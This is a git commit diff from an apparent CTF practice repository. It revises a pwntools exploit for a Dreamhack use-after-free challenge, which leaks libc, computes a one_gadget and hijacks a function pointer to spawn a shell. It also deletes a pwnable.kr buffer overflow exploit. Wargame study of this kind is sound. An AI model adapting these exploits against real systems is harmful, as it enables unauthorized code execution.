9c23ac793b3f9bc1e8367303f12e6a05b1cbb593
purplesky <pwned@korea.edu>
2024-08-27 13:04:31 +0900

    240827 reload

--- dreamhack_pwnable/uaf_overwrite/ex.py
+++ dreamhack_pwnable/uaf_overwrite/ex.py
@@ -1,9 +1,7 @@
 from pwn import *
 
 #p = process('./uaf_overwrite')
-#p = remote('host3.dreamhack.games', '22501')
 p = remote('127.0.0.1', 7182)
-def slog(sym, val): success(sym + ': ' + hex(val))
 
 def human(weight, age):
     p.sendlineafter(b'>', b'1')
@@ -21,17 +19,15 @@ def custom(size, data, idx):
     p.sendlineafter(b': ', str(idx).encode())
 
 # UAF to calculate the `libc_base`
-custom(0x500, b'AAAA', -1)
-custom(0x500, b'AAAA', -1)
-custom(0x500, b'AAAA', 0)
-custom(0x500, b'A', -1)
+custom(0x500, b'aaaa', -1)
+custom(0x500, b'aaaa', -1)
+custom(0x500, b'aaaa', 0)
+custom(0x500, b'a', -1)
 
-lb = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc41
-og = lb + 0x10a41c # 제약 조건을 만족하는 원 가젯 주소 계산
+libc_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3dea61
+one_gadget = libc_base + 0x10a41c # 제약 조건을 만족하는 원 가젯 주소 계산
 
-slog('libc_base', lb)
-slog('one_gadget', og)
 # UAF to manipulate `robot->fptr` & get shell
-human(1, og)
+human(1, one_gadget)
 robot(1)
 p.interactive()
--- pwnable_kr/bof/bof.py
+++
@@ -1,6 +0,0 @@
-from pwn import *
-
-p = process('./bof')
-payload = b"A"*(0x2c+8) + p32(0xcafebabe)
-p.sendline(payload)
-p.interactive()
